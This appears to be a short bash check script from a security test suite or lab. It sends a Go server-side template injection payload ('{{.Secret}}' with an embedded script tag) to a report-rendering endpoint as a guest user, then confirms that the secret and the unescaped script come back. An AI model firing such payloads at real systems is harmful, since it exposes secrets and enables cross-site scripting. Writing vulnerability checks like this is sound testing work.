#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/reports/render" -H 'content-type: application/json' -d '{"template":"{{.Secret}}<script>GO-SSTI</script>","user":"guest"}' | grep -q 'GO-REPORT-SECRET<script>GO-SSTI</script>'
